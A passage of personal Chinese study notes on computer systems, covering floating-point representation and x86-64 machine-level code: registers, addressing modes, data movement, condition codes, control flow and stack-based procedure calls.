的幂的无符号数除法：等同于逻辑右移，向零舍入（由于没有无符号没有负数，向零舍入与向下舍入貌似效果一样）； 除以 2 的幂的补码，向下舍入：算术右移； 除以 2 的幂的补码，向上舍入：增加偏置量，算术右移；等于给 x 增加 y - 1，这样就可以确保向上舍入了； 对于使用算术右移的补码除法：(x &lt; 0 ? (x + (1 &lt;&lt; k) - 1) : x) &gt;&gt; k 由于 C 语言中有无符号类型，当不小心将有符号与无符号进行一起运算时，会触发强制类型转换，并可能出现预想不到的结果；因此，使用 C 语言中的无符号数时，要非常小心，如果可以的话，尽量不要用； 浮点数 二进制小数 对于十进制数，小数点左边的值可以表示为10的正幂，小数点右边的值可以表示为 10 的负幂； 对于二进制，10 则替换为 2，左边为2的正幂，右边为2的负幂；小数点左移一位表示整个数乘2，右移一位表示整个数除2； 就像十进制不能精确的表示1&#x2F;3 之样的数，二进制也不能够精确的表示 1&#x2F;5 这样的数，它只能通过增加位数达到尽量近似的表示； 定点表示法：小数点左边的数，用相应的二进制表示；右边的数，则使用二进制分子&#x2F;2n 来表示 缺点：不能很有效的表示非常大的数；例如对于 5 * 2100，需要在 5 的二进数 101 后面，跟上100个零，一般的64位机器都不够用了； IEEE 浮点表示 格式：V &#x3D; (-1)s * M * 2E，即将数字转化成近似 x * 2y 的格式来表示实数（优点是可以表示很长的小数位，缺点是越长的时候，精确度下降越多） 符号位（sign）：s 为 sign 缩写，用来表示正数 (s 为 0) 或负数 (s 为 1)； 尾数(significand)：M 是一个二进制小数，它的范围是 12 - ε（规格化值），或者是 01 - ε（非规格化值）； 此处的 ε 是指多少？在数学里面, ε 表示非常小的意思； 读音 Epsilon，第五个希腊字母，跟英文的 e 顺序相同，原表示简单的、单一的意思；它的大写就跟英文 E 一模一样了； 貌似是用来表示小数段，所以叫二进制小数？ 阶码(exponent，或许也叫指数)：E 的作用是对浮点数加权，这个权重是 2 的 E 次幂（可能是负数）； 单精度，用8位表示，故E 的取值范围为 -127~127； 双精度，用11位表示，故E 的取值范围为 -1022~1023； 在不同的数据类型中，符号位总是只用一个位来表示，但尾数和阶码占用的位数则会不同； 单精度：阶码 E 使用 8 位，尾数 M 使用 23 位； 双精度：阶码 E 使用 11 位；尾数 M 使用 52 位 三种情形 规格化：指数位不全为 0，也不全为 1； 此时 E &#x3D; e - Bias（使用偏置值来表示，暂时不知道这么做的用意？后来发现是为了实现平滑过渡）； 假设指数位有 k 位 e 的位表示为 ek-1ek-2…e1e0，因此，e 是一个无符号数，其取值范围在 1 ~ 2K-1 Bias &#x3D; 2k-1 - 1，因此，对于单精度结果为 127，对于双精度结果为 1023； 此时 M &#x3D; 1 + f， 而 f &#x3D; 0. fn-1 fn-2…… f1 f0，所以最终 M &#x3D; 1. fn-1 fn-2…… f1 f0 f 的取值范围在 0 ~ 2-n ~ 1 之间，即 0~(1 - ε) 之间，无限靠近 1，但达不到 1 ； 因此 M 的取值范围为 1~（2 - ε ）之间 此处 M 中的 1 是在规则标准中隐含的，并不需要实体的位进行表示； 非规格化：指数位全为 0，小数位不全为 0； 此时 E &#x3D; 1 - Bias 仍然使用偏置值来表示 E，但使用了 1 而不是 0，因为这种做法可以保证非规格化数和规格化数之间可以实现平滑过渡； 此时 M &#x3D; f，而不是 1 + f，因此，在这种情况下就有办法表示 0 了（在规格化的情形下，由于 M 总是大于 1，所以表示不了 0）； 特殊值 无穷大：指数位全为 1，小数位全为 0； 此时根据符号位的情况，可以用来表示正无穷大和负无穷大； 还有一个好处，是当两个非常大的数相乘时，我们可以返回结果，表示得到了 无穷大，能够用来表示出现溢出； NaN：指数位全为 1，小数位不为 0； 表示得到了一个非数，即 not a number；有某应用中，可以用这个值来表示未初始化的数据； 注意，最后 V 的结果是 M * 2E，因此注定了分布的不均匀，而是越靠近 0 的位置，能够精确表示的数越多，越远离 0 则越少 貌似这也非常合理，因为浮点数本来就是要用来表示小数的； 数字示例 对于 IEEE 浮点表示法 当用来表示正数时，所有位表示从无符号数的角度进行解读，它们会呈现升序排列；因此，用于整数排序的函数，同样也可以用于正的浮点数； 当用来表示负数时，由于开头有1，因为会呈现降低排列； 发现单精度或者双精度，其能表示的最大整数，要比无符号整数类型要大得多，前者为 (2 - ε) * 2127，后者为 (2 - ε) * 21023；而最大的无符号整数仅为 264； 不过并不能用它来替代整数类型，因为它们并不能精确表示整数，只能近似； 舍入 四种舍入方式 向偶数舍入：出现中间值时，确保舍入结果的最低有效位为偶数；好处：可以用来避免统计偏差； 注意，是最低有效位，因此这个方法也可以用于小数的舍入； 向零舍入：正数向下，负数向上； 向下舍入 向上舍入 浮点运算 浮点加法不具有结合性；因为存在舍入，所以先计算哪部分将导致不同的结果；但浮点加法可交换，且有逆元（无穷和 NaN 除外）； 浮点加法具有单调性，即对于任意 a &gt;&#x3D; b，x + a &gt;&#x3D; x + b 仍然成立； 浮点乘法也不具备可交换性；原因；可能发生溢出，或者由于舍入导致失去精度； 浮点乘法也不具备可分配性；原因：同上； C 语言中的浮点数 由于 C 语言没有要求使用 IEEE 浮点表示法，因此缺乏标准的方法来改变舍入方式，或者得到无穷和 NaN 值； 小结：必须非常小心的使用浮点运算，因为它不具备整数运算的结合律； 程序的机器级表示 综述 通过了解程序的机器代码表示（阅读汇编代码），能够更容易的发现程序的性能瓶颈； 程序编码 GCC 工作过程 预处理器插入文件 -&gt; 编译器将源码转成汇编代码 -&gt; 汇编器将汇编代码转成机器代码 -&gt; 链接器连接机器码使用到的库文件，生成可执行文件； 疑问：源文件引用了多份其他文件，它们是单独编译后链接，还是插入源文件一起编译？答：单独编译后再链接； 编译器生成的 .o 文件，源代码被转换成了目标代码二进制文件，但还是还未填入全局内存地址 好奇什么时候填入呢？答：链接的时候填入； 链接器的任务之一，是为函数调用找到匹配的函数的可执行代码的地址； 机器级编程提供了两种重要的抽象 指令集架构：提供了机器级程序的格式和行为，定义了包括处理器的状态、指令的格式、指令对状态的影响等； 虚拟内存：机器级程序使用的内存是虚拟内存，它提供了一个非常庞大的专用的字节数组；（操作系统会负责将虚拟地址映射到实际的内存地址中） 寄存器 计数寄存器：用来保存待执行的下一条指令的内存地址； 这里的内存地址貌似应该是虚拟内存的地址？答：是的 整数寄存器：用来保存地址或整型数据；（据说有16个命名的位置）（从%rax 到 %rap） 根据地址使用长度的不同，同一个地址有不同的名称； 条件码寄存器：用来保存最近执行算术或逻辑指令的状态信息，用来实现条件控制； 向量寄存器：用来存储一个或多个的整数或浮点数值；（与整数寄存器的具体区别是什么？貌似用于 SSE 流计算，即单条指令批量处理多个数据） 思考 寄存器或许应该也算是存储系统的一部分，假设整个程序由指令+数据组成的话，那么指令和数据都需要有存储的空间，在这个存储空间中，每条指令和数据，都有相应的地址；指令的执行是有顺序的，那么它最终反映到程序中，即翻译成的机器代码，每执行完一条指令，要如何才知道下一条指令在哪里？需要有一套机制，让每条指令执行完毕后，能够知道下一条指令的地址；或许，指令的地址，本身就是一种写死的结果？它根本就不需要寻找，而是写死在代码中的？貌似有点道理的样子；只要内存中有一部分用来存储指令的内容，而且它们的地址在整个程序运行的期间不发生变化，那么指令的地址写死在机器代码中貌似就是可行的；但是需要有另外的位置存储状态信息，这样在程序执行过程中，可以根据状态信息做分支管理； 答：实际上通过虚拟内存 + 物理地址翻译的机制来实现；每个应用程序的编译的时候，使用虚拟内存进行编址； 每执行一条指令的时候，CPU 都会计算下一条指令的地址，并存入程序计数器；同时整数运算会设置条件码寄存器，用于分支判断； 实际情况：绝大多数指令是顺序执行的，因为下一条指令的地址，即计数寄存器的值+1；如果不是顺序执行，则当前指令需要给出下一条指令的地址；（当前指令不一定给出下一条指令的地址，但是可以从指令类型计算出来，或者直接得到，例如 jmp&#x2F;call 等指令） x86-64 的指令长度从1-15个字节不等；常用的较短，不常用的较长； 指令以某个特定的值开头，例如53，同时它还代表了指令的长度格式，这也意味着在它的长度之后，才是第二条指令的开始； 但 CPU 取指的时候，是按固定长度取的，译码后会将多余的部分舍弃； 指令末尾的 q 表示长度指示符（不同数据类型的字节长度），在大多数情况下可以省略； 为什么需要用 q 来表示长度？莫非是用来操作数据用的？ 指令存储在哪里？印象中一开始也是在程序代码块中，之后是否单独加载到指令寄存器中？ 貌似没有指令寄存器，而是使用计数寄存器； 答：指令就是代码，从磁盘加载后，它存储在内存中； 正常情况下一条指令应该是要由四部分组成的：操作码、操作数地址、操作结果存储地址、下条指令地址；为了压缩指令的长度以节省空间，其中的下条指令地址，转交给了计数寄存器进行管理 那它是如何实现管理的呢？ 答：正常情况下，指令是按顺序执行的，因此每条指令的地址是挨着的，因此下一条指令的地址，就是当前指令在计数寄存器中的地址加1；这就是计数寄存器的名称由来；当出现条件分支时，就会用指令中的地址替换刷新计数寄存器中的地址；这么一来，对于条件判断的指令，它的内容中的下条指令地址就是必须的了； 操作码对应具体操作，而每个具体的操作，又决定了需要的地址数量，共有五种常见情况 三地址：前两个分别是第一操作数和第二操作数地址，第三个是结果存储地址； 双地址：第一个是第一操作数地址，第二个是第二操作数地址兼结果存储地址； 单地址：第一操作数地址；在指令操作码中暗含第二操作数和结果存储地址； 零地址：在指令操作码中暗含了三个地址（一般使用在堆栈型计算机中，用堆栈顶部的两个单元作为第一操作数和第二操作数；堆栈顶做为结果存储地址）； 可变地址：根据操作码的情况，匹配有多个地址； 貌似将机器代码加载到寄存器的时候，不是一条一条加载的，而是以16字节为一个单位进行加载的，有待确认一下； 如果是真的，那么就可以翻译编译有时候会额外插入一些多余的无效指令，以凑成16个字节了；（其实也不用插入多余的空指令，CPU 可以从当前指令计算出下一条指令在哪里） 生成可执行文件时，需要对一组目标文件使用链接器进行链接，并要求这组目标文件中，至少一个文件包括一个 main 函数； 如果没有 main 函数，生成的估计就不叫做可执行文件，而叫做库文件了； 编译过程中，最后一步的链接动作，它的工作就是将编译后的目标文件，与静态库或者动态库建立链接；这样程序就可以正常运行了， 因为源码中用到的库的函数，由于有了链接，就可以找到函数地址并执行； 有趣的是，据说如果生成的机器代码不足16字节，还会在末尾加上 90（nop）来凑够16字节，即以16个字节为一个处理单位； 为什么一定要16字节呢？难道是因为指令的长度为1-15个字节？答：为了减少从内存读写的次数，统一按固定的单位进行读写； 汇编代码有多种表述的格式，包括AT&amp;T，Intel，Microsoft 等； 反汇编器可以用来将机器代码的文件，转换成较为方便阅读的汇编代码格式； 刚发现 GCC 支持在 C 源代码中嵌套汇编代码，以实现对机器一些低级特性的访问；另外还可以通过汇编代码编写整个函数和文件，然后在链接阶段，将它们与 C 的代码链接起来使用； 数据格式 由于最早是从16位衍化到64位的原因，当时16位称为一个字（word，Intel 的术语，两个字节等于一个字），所以现在32位只好称为双字，64位称为4字；这些字的单位，是用来表示数据类型的长度的；但现在更通用的说法，貌似不是使用字表示，而是使用字节来表示数据类型的长度；但是这个“字”的单位，仍然在汇编代码中沿用；在汇编代码最后一个字符的后缀中，经常使用字来表示操作的数据长度； 数据格式跟指令格式是不同的； 不同的数据类型，有不同的数据长度，在汇编指令中使用不同的后缀 char -&gt; b, short -&gt; w, int -&gt; l, long -&gt; q, char * -&gt; q, float -&gt; s, double -&gt; l byte, word, long word, quad word, single, long single; 字节，字，双字，四字，单精，双精； movb, movw, movl, movq 分别表示传送1个字节，1个字，2个字，4个字 字母 L 的小写同时用来表示4字节的整数和8字节的双精度，但由于浮点数的指令和寄存器与整数完全不同，因而不会产生歧义 访问信息 x86-64 位的 CPU 的整数寄存器模块中（用来存储整数和指针），有16个寄存器，每个可以存储64位，编号分别为从 %rax 到 %rbp，另外还有8个为 %r8 到 %r15； 早期只有8个寄存器，编码是从 ax 到 bp； rax, rbx, rcx, rdx, rsi, rdi, rbp, rsp, r8, r9, r10, r11, r12, r13, r14, r15; 后缀 x, i, p 不知是否有什么含义？p 貌似是指针的意思； sp 貌似指栈指针；用来指明运行时栈的结束位置？ %r 表示寄存器的意思（r 估计应该代表寄存器的单词 register） 每个寄存器有64个位；整数寄存器模块中有16个寄存器，意味着这个模块总共有 16 * 64 &#x3D; 1024 位可以用，8位为1个字节，因此貌似有 128 字节； 由于这16个寄存器各有自己的编号，所以当和指令的操作码配合使用时，感觉好像将它们当作指针在操作的感觉；更有意思的是，为了实现历史兼容，每个寄存器的全64位、低32位，低16位，低8位，都有自己的名字；也就是每个寄存器实际上有4个名字，分别代表它身上不同长度的部位； 汇编代码中的操作数指示符 operand：用来指出一个操作中，需要使用到的源数据值，以及结果的存放位置； 源数据值通常使用常数给出，也可以是从内存或寄存器中读取； 三种操作数类型 直接数（立即数，表示常数值）immediate，用 Imm 表示 寄存器（引用，表示某个寄存器中的内容） register，用 R[r] 表示其值 内存（引用，表示内存中的内容）memory，用 M[addr] 表示其值； 寻址模式的计算公式为 Imm + R[rb] + R[ri] * s，用来计算操作数的值； 有立即数寻址，寄存器寻址，直接寻址，间接寻址、变址寻址，比例寻址等类型 不同的类型对应不用的格式，包括 $Imm, ra, Imm, (ra), Imm(rb), (rb, ri), Imm(rb, ri), (, ri, s), Imm(, ri, s), (rb, ri, s), Imm(rb, ri, s) 最常用的格式是 Imm(rb, ri, s)，其他格式都是这个格式的特殊情况； 以上都是汇编代码的格式，好奇这个格式在机器代码中是如何体现的呢？是否直接翻译成了绝对地址？还是怎么处理？ 答：汇编的格式和机器指令的格式基本一样，只是汇编中的符号，替换成了二制制的数字和地址； 规律： r 和 s 只能写在括号里面 Imm 如果不直接用，则用来做加法的； rb 用来加，ri 和 s 用来乘 Imm 带美元符，直接用其值，否则是指内存 ra 在括号外面是寄存，在括号里面是内存； 凡有带括号，都是内存，即使用间接寻址；（其实只有两种不是内存） 数据传送指令 数据传递指令有很多种，它们可以分成不同的类；每一类执行相同的操作，只是操作数大小不同（例如有些是单字，有些是双字）；包括 MOV 类，MOVZ 类，MOVS 类 MOV 类：不改变目的位置的高位（除了 movl 外） MOVZ 类：源小目大；目的位置高位进行零扩展：即高位置0；目的地仅限寄存器，不能是内存； MOVS 类：源小目大；目的位置高位进行符号扩展：即高位置为符号位的复制；目的地仅限寄存器，不能是内存 在 X86-64 中，不允许将数据从内存移动到内存，需要先到寄存器中转后，才能到内存，即需要两条指令才能完成（暂时不知道这么做的原因是什么？现在知道了，为了让指令做流水线化处理，在一定数量的时钟周期内处理完毕，同时避免依赖） movl 有点例外，它在传送双字的时候，会把高位设置为 0；其他几个 movb, movw, movq 都不会有这种效果，即不会对高位做额外的操作； movq 由于是操作四字的数值，因此它的源操作数的立即数只能是4字节32位表示的补码数字；而 movabsq 则能以8字节64位的立即数做为源操作数； MOV 类是长度不做变化的移动，如果源和目的的长度不同，需要使用扩展类的指令；除非源为直接值； 当源为直接值，且使用 movabsq 时，相当于初始化的动作了； rax -&gt; eax -&gt; ax -&gt; al ，分别对应 64位 -&gt; 32位 -&gt; 16位 -&gt; 8位 MOVZ 和 MOVS 类的指令，最后两个字符分别用来表示源和目的的大小； 例如 movzbw，mlvsbw 等； 还有一条特殊的指令是 cltq，它的特殊之外在于没有源操作数，也没有目的操作数，这两个操作数是暗含的固定值，源是 %eax，目的是 %rax，使用符号扩展的方式； 突然发现，操作码最后表示长度的字符，跟操作数的位数需要是匹配的 示例：movl %rax, (%rsp)，在这条指令中，操作码 movl 最后一个字符是 l ，表示它要移动双字长度的数据，但 %rax 却是四字长度的地址，这样会产生不匹配的错误，因此，要么将操作码改成 movq，要么将第一操作数 %rax 改成 %eax； 另外目的地址的长度也是需要跟操作码表示的长度匹配，例如操作码的目的长度为 q，则目的操作数的长度不能小于 q；因此例如 movl %eax, %rdx 是错误的，因为操作码要移动双字，但目的操作数 %rdx 是四字的； 貌似以上规则只适用于寄存器，不适用于内存；因为内存地址永远都只有一种表示方式和长度，不像寄存器不同位长度还有不同的名字； 内存寻址模式中，使用的都是四字长度的寄存器名称；例如应为 (%rbx) 而不是 (%ebx） 什么时候应该使用零扩展，什么时候应该使用符号扩展？ 总结：源值有符号就使用符号扩展，源值无符号就使用零扩展； 当源值有符号，使用符号扩展可以使得符号得到保留；使用零扩展可能改变源值； 当源值无符号，使用零扩展会保留源值；使用符号扩展可能会改变源值； 只有源小目标大的时候，才需要扩展，如果是一样大，或者源大目标小，则不需要使用扩展，直接移动； 数据传送示例 C 语言中的指针，其实就是地址，它是一个整数值；我们可以把它存储在寄存器中，假设为 %rax；所谓的指针解引用，其实就是使用这个整数值，去访问对应的内存地址，例如 (%rax），并进行相应的操作，例如将数据移入； 压入和弹出栈数据 据说栈在函数调用过程中起到至关重要的作用，很好奇它是如何发生的； 栈并不让人陌生，它只是一种抽象数据结构，只在一端写入和弹出，遵循先入后出的原则； 栈存储在内存中的某个区域，然后由于它是向下增长，所以越新的元素，它的地址反而越低，越早的元素地址越高； 如何控制栈的大小？ 新的指令 pushq, popq：将操作数压入或弹出栈；只有一个操作数，压入时代表源，弹出时代表目的地；push 暗含目的地址存储在 %rsp（这个寄存器条目通常用来存储栈指针） subq：减，两个操作数，第一个表示要减少的值，第二个表示被减少的值； 所谓的弹出，其本后真正的动作并不是把栈顶数据擦除，而只是改变栈顶指针到了原栈顶元素之后的第二个元素；原栈顶位置的元素，只要没有被其他操作覆盖，其里面存储的值会一直在； 算术和逻辑操作 共有四种操作类型，分别为加载有效地址、一元操作、二元操作、移动操作； 所谓的加载有效地址操作，它其实并不是去引用内存的值，而只是取得内存地址，然后存放到寄存器中；指令格式为 leaq S, D 这个指令非常有欺骗性，例如假设 x 在 %rdi，那么 leaq 7(%rdi) %rax 的真实意思是先计算出 %rdi + 7 的值，假设为 tmp，然后并不到内存中去引用 M[tmp]，而是直接将 tmp 写入到 %rax 中；这个指令表示上只是移动数据，但它间接使用了一些计算，因为寻址模式会自动触发一些运算； 一元操作只有一个操作数，这个操作数既是源，也是目的；它可以是一个寄存器，也可以是一个内存位置； 指令包括： INC, DEC, NEG, NOT 二元素操作有两个操作，其中第二个操作既是源也是目的； 指令包括：ADD, SUB, IMUL, XOR, OR, AND 移位操作： SAL：算术左移，低位补0； SHL：逻辑左移，效果同SAL，不知为何要重复两个一样功能？莫非只是为了对称？ SAR：算术右移； SHR：逻辑右移； 注意，加载“移位量”参数到寄存器后，固定使用%rcx 寄存器，并且在访问时，只访问其最低位字节里的内容，即 %cl； 特殊的算术操作 64位的乘法和除法指令：imulq, mulq, cqto, divq, idivq; 两个64位数的乘法，结果会达到128位，因此，可以通过将结果拆分成两段存储，来间接实现效果；其中的低位段存储乘积的64位取模，高位存储乘数即可； 128位除法实现原理：也是将数据拆分成高位和低位两段，分别存储在两个寄存器中，然后进行运算； 对于除法，多数64位的除法并不会涉及到128位，所以高位的寄存器一般全部置0或者置为符号位；运算指令同128位； 复制符号位时，会用到一条特殊的指令 cqto，它没有显式的操作数，而是隐式读取 %rax 的符号位，然后复制到 %rdx 的所有位上面； 控制 正常情况下，指令是按顺序执行的；但实际编程中，根据条件会有代码执行的分支；机器代码的机制为：测试数据值，然后根据测试结果改变控制流或者数据流；在汇编中，可通过 jump 指令来实现指令执行顺序的跳转； 条件码 条件码存放在单个位的寄存器中（这么说，这些寄存器都很小？答：是的） 常用的条件码有： 进位 CF，carry flag 零位 ZF，zero flag 溢出 OF, overflow flag 符号 SF, symbol flag 除了加载地址的指令外，几乎所有的算术和逻辑指令，据说都会设置条件码（猜测是因为它们都有可能产生各种需要判断的情况） 还有一些指令专门改变条件码，但不改变其他寄存器，例如 CMP 比较系列和 TEST 测试系列； CMP 系列指令的行为同 SUB 减法指令，区别在于它只改变条件码，不改变其他寄存器中的内容； TEST 系列指令的行为同 ADD 加法指令，区别在于它只改变条件码，不改变其他寄存器中的内容； 访问条件码 条件码一般不直接读取，常见有三种使用方式： 根据条件码组合，将某个字节置为0或1，即 SET 系列指令； SET 指令的后缀不是表示操作长度，而是表示条件码组合类型；例如 setl 表示 set less，setb 表示 set below； 有些有符号数和无符号数的 SET 指令是一样的，但也有一些 SET 指令对应单独的有符号或者无符号版本，根据操作数的长度，加上符号类型，可以大致推断操作数的原始类型； 根据条件码跳转到程序的某个部分； 根据条件码传送数据； 跳转指令 汇编代码中，使用标记(label) 来指示要跳转的位置（感觉有点像 C 语言中的 GOTO），然后汇编代码转成目标代码时，跳转语句中的标记会被替换成跳转的目标位置的地址； 跳转指令 jmp 可以以寄存器地址为跳转目标，也可以以寄存器中存储的内存地址的解引用内容做为跳转目标；前者叫做直接跳转，后者叫做间接跳转； 除了 jmp 是无条件跳转外，其他跳转指令都是带条件的，而且它们只能是直接跳转；条件后缀的格式同 set 指令；在跳转前会判断条件，只有当条件码满足时条件要求时，才会跳转； 大于和超过，小于和低于之间的区别是什么？区别莫非在于操作数的顺序不同？ 跳转指令的编码 跳转指令的编码有两种 一种是相对编码（常用），以目标地址和当前下一条指令的地址的差，做为跳转目标； 使用时，将跳转目标的值，加上下一条指令的地址值，即可得到目标地址的值； 事实上，它也关联了计数寄存器的设计，因为计数寄存器中，刚好也存着下一条指令的地址； 另一种是绝对编码，以4个字节（32位）来表示目标地址的绝对值； 相对于绝对编码的方式，相对编码的好处是写法更简洁，而且当我们将目标代码拷贝到内存中的不同位置时，程序也能够不受影响的正常运行，非常方便； 突然明白为什么32位的机器最大内存只能有4个G了，因为 CPU 的计数器用来存储地址时，只有32位，那么意味着它最大能够存放 4G 对应的地址长度； rep ret 的指令组合是一种空操作，用来避免 ret 成为条件指令的跳转目标；它可以让代码更加安全（AMD 的设计） 刚发现编译器的作者需要直接跟 CPU 的指令集打交道；不知这中间是否有一层抽象，让编译器作者可以在更高的抽象层次上面工作？有，这一层抽象就是指令集架构 ISA； 上一条指令和下一条指令的间距，跟上一条指令的编码长度有关，即上条指令假设使用了2个字节来编码，则下条指令的地址在当前地址加2；如果使用3字节，则在当前地址加3； 刚发现小端法，不是指单个字节内部的小端，而是整个类型多个字节顺序的小端； 用条件控制来实现条件分支 对于 C 语言中的 if-else 条件分支，汇编代码中的处理办法是针对 if-else 的两个部分，各产生对应的代码块，然后在代码块之间插入条件分支，根据条件判断结果，进行分支的跳转；很像 C 语言中的 goto 风格； 刚发现 C 语言中的短路求值，原来跟编译器生成的代码有关系，对于 C 语言中的复合判断语句，在汇编代码中，其实有对应多个判断指令，当某个判断指令结果不通过时，就会直接跳转到结果指令，从而实现了短路； 对于 cmp 指令，操作数的顺序，与后续的 jump 指令的条件后缀，是相反的关系，例如 cmpq $-3 %rdi jge .L2 此处 ge 表示当 -3 大于等于 %rdi 时，所以，编译成 C 语言时应为 %rdi &lt; -3 或者 -3 &gt;&#x3D; %rdi 时； 用条件传送来实现条件分支 条件控制机制的优点是简单且通用，缺点是低效，因为这是单线程的；条件传送机制则可以通过并行弥补缺陷，但使用的场景有限； 条件传送机制会计算所有的分支，最后根据条件判断，传送其中一个分支的结果；由于现代处理器采用“流水线”机制，实现了多个指令的并行执行，因而条件传送有可能获得更高的性能； 流水线机制：一条指令的执行，被拆分为多个步骤，包括从内存读取指令（取指），确定指令类型（译码），从内存读取数据（访存），执行算术运算（执行），向内存写入数据等（写回）；不同指令之间，这些步骤是大致相同的，因此，通过批量处理多条指令的同一个步骤，就间接实现了指令级的并发； 在条件控制机制下，处理器会尽量精密的预测哪个分支被执行的概率更大，然后挑选一个，按流水线批量处理；但它的判断有可能不对，这个时候，批量处理的东西没用，需要更改位置，做下一批的处理，前面的预处理就浪费了； 在条件传送机制下，处理器则根本不用判断，直接批量处理指令的各个步骤即可，从而在平均水平上，实现了更高的性能； 条件传送指令固定有两个操作数，分别代表源和目的地，后缀同 SET 和 JMP 系列，但它不支持单字节的传送，只支持16位，32位和64位的传送； 无条件传送的指令，操作数的长度做为指令的后缀；但有条件传送的后缀则没有指定长度，怎么办？答：汇编器通过目的地操作数的名字，来推断长度；因此，不管操作数的长度是多少，有条件传送的指令名称都是一样的； 条件传送的局限性： 只能使用在条件分支不会产生副作用的场景下； 如果每个分支都需要大量的计算，则并行处理有可能并不划算； 循环 do-while 循环 理解汇编代码和原始代码之间的关系，重点是找出变量值和寄存器之间的映射关系； 逆向工程通用策略： 循环之前如何初始化寄存器； 循环中如何更新寄存器； 循环后如何使用寄存器； 结构 loop: body-statement t &#x3D; test-expr; if(t) goto loop; while 循环 一般有两种翻译方式，一种是跳到中间(jump to middle)， 一种是 guarded-do，即先检测条件，当条件符合的时候，再进入循环 当使用较高优化等级的时候，编译器会使用第二种策略； for 循环 for 循环其实可以翻译成 while 循环，同样可以有两种翻译方式，取决于优化的等级； 循环中的 continue 同样使用 goto 来实现，区别在于，应该跳转到条件更新的语句，而不是直接重新开始循环，遗漏更新条件，否则可能会导致无限循环； switch 语句 使用跳转表来实现； GCC 引入了一个新的符号 &amp;&amp; 来获取代码块的地址，做为跳转表的元素；使用的时候，通过数组下标获得地址，然后按地址进行跳转； 重复的情况使用相同的代码标号； 缺失的情况使用默认标号； 使用星号表示间接跳转，示例：jmp *.L4(, %rsi, 8); 过程 实现机制：假设调用者为 P，被调用的函数为 Q 传递控制：将程序计数器设置为 Q 的起始地址；当调用结束后，计数器重新设置为 P 下一条指令的地址； 在这个过程中，会为 Q 新开一个栈，栈顶存储着 P 下一条指令的地址； 印象中 CPU 内部还自己维护了一个栈，用来快速获取 ret 指令的返回地址； 出栈的时候，会将栈顶的地址弹出，并相应修改计数器的值，以便跳转到原来 P 中断处的下一条指令继续完成 P 的执行； 传递数据：P 能够向 Q 提供一个多个的参数，Q 能够向 P 返回一个值； 分配和释放内存：调用 Q 的时候，为其局部变量分配空间；调用结束后，释放这些空间； 运行时栈 多数语言主使用栈数据结构，来实现传递控制、传递数据、分配和释放空间等工作 通过在栈里面存储相关的信息来实现，例如返回地址、参数值，局部变量值、寄存器值等； 然后在机器代码中，去读取这些栈中保存的信息，实现过程的控制； 感觉每个栈桢很像当前运行状态的一个快照；看来寄存器需要和内存紧密配合，才能完成复杂的控制； 由于内存速度比寄存器慢得多，有没有可能将栈放置在处理器的多级缓存中？不过貌似这个缓存也不够大； 一般栈地址从高地址向低地址的方向进行增长；每个调用过程占用地址中的一个段，这个段叫做栈桢； 当过程所需的存储空间超过寄存器的存储限制时，就会触发在栈上分配新空间； 当使用完这个分配的空间后，通过栈顶的返回地址跳回调用前的位置，实现栈的销毁；实际上栈的数据并没有销毁，但由于栈顶的位置变化了，所以相当于被销毁了； 栈顶的地址，是存储在寄存器 %rsp 中的；当跳转回调用函数 P 的下一条指令时，应该如何修改 %rsp 的值，以便让其指向 P 的栈顶（如有）？ 好奇在分配新栈的时间，里面很有可能是存着以前的旧数据的，那么是否需要一个初始化的动作，将旧数据清空销毁掉？还是说，有写入直接覆盖，没写入当作没有使用？ 不需要销毁，首先栈桢只分配占用所需空间，那么意味着空间利率为100%；所以每个内存地址里面的内容都会被改写，从而实现覆盖； 大多数过程的栈桢都是定长的 意思是在过程开始时，整个栈有多大，就已经定下来了，在过程中间，整个栈的大小是不会变化的； 每个过程只会分配自己所需要的空间，以提高内存使用效率；有些简单的过程甚至都不用分配内存空间，直接在寄存器中就可以完成操作； 好奇什么情况下不是定长的？ 栈溢出是否跟这个定长规则有关？ 并不是每个函数调用都需要使用栈桢，例如只要它的参数少于6个，就可以通过寄存器实现数据传递；或者它不需要在过程中调用其他函数； 转移控制 通过指令 call，将程序计数器(PC, program counter) 设置为被调用函数的地址；并将当前过程下一条指令的地址 A 放入到栈顶；这样当 Q 调用结束时，可以使用指令 ret 从栈中弹出地址 A，并设置 PC 中的值为 A，实现返回控制的效果； 如果 ret 是用来弹出地址，那返回值应该如何处理呢？ 调用很像跳转，通过标号（直接跳转）或者操作数指示符（间接跳转）来指定新的位置； 数据传送 大多数情况下，函数调用使用寄存器来实现参数传递；即将被调用函数 Q 需要的参数复制一份放在寄存器中，这样 Q 的过程开始后，就可以直接使用寄存器的这些参数了；当 Q 有返回值的时候，也同样使用寄存器将返回值传递给 P 使用； 不过寄存器最多只能用来传递最多6个的整形参数（整数或者指针）；超过的部分，只能通过栈来传递； 通过栈来传递参数时，所有的数据大小都按8的位数对齐（8个字节，64位）； 假设函数有 n 个参数，则其中的 7 ~ n 号参数存储在栈桢中； 栈桢中数据的存储数据为（从顶到底方向，也即从低到高方向）：返回地址（即栈顶）、参数构造区，局部变量，被保存的寄存器； 在参数构造区中，7 到 n 号参数的顺序按从顶到底的方向排列；因此，可以通过栈顶指针 + 8 的倍数偏移，来实现对参数的访问； 由于参数大小有64位的限制，猜测对于容器类型数据（例如数组或结构），参数区域实际存储的是指针，数据实际存储在局部变量区域中； 使用寄存器传递参数，是有顺序要求的，即参数的位置和寄存器，是一一对应的； 栈上的局部存储 通过减少 %rsp 的值，就可以实现栈的分配；通过增加 %rsp 的值， 就可以实现栈的销毁；（因为内存地址分配按从高到低的顺序） 如何知道应该增加多少和减少多少？ 假设已经知道增加多少，那么在返回过程时，是否直接写死应掉减去多少？ 经查询，发现栈的创建和销毁，是直接写死在机器代码中的；通过 sub 和 add 指令直接操作 %rsp 的值来实现； 寄存器中的局部存储空间 为避免被调用函数，覆盖了调用函数在寄存器中保存的数值，对于寄存器的使用，是有惯例的；其中有部分被划分为被调用者保存的寄存器（%rbx, %rbp, %r12~%r15），调用过程中不得更改；如需要更改，则需要保存一份到栈中，调用结束后，从栈中弹出，将寄存器还原成原来的值； 除了被调用者保存的寄存器以及栈指针之外的其他寄存器，都分类为调用者保存的寄存器，即对于这些寄存器，调用者自身需要承担保存的责任，而不是由被调用者进行保存； 这些寄存器是公用的，所以下一个被调用的过程也会使用它们，因此，在进入下一个过程之前，调用者本身应该先自己保存好这些寄存器里面的值（如果需要的话） 递归过程 由于每次新建的栈桢，都可以有自己的局部存储保存私有状态信息，因此它可以做到每次调用之间都不会相互干扰，从而能够实现递的过程； 数组分配和访问 基本原则 T A[N]，N 个 T 类型的元素，假设每个 T 类型元素的长度为 L，则总长度为 L * N； 通过 (Rb, 